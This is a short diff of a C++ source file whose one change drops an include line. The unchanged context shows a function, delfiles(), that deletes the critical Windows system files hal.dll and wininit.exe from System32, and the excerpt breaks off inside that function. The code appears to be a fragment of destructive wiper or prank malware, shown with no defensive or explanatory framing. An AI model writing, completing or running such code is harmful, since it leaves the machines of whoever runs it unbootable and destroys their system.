@@ -1,6 +1,5 @@
 #include <iostream>
 #include <windows.h>
-#include <fstream.h>
 void delfiles() {
   std::remove("C:\\Windows\\System32\\hal.dll");
   std::remove("C:\\Windows\\System32\\wininit.exe");
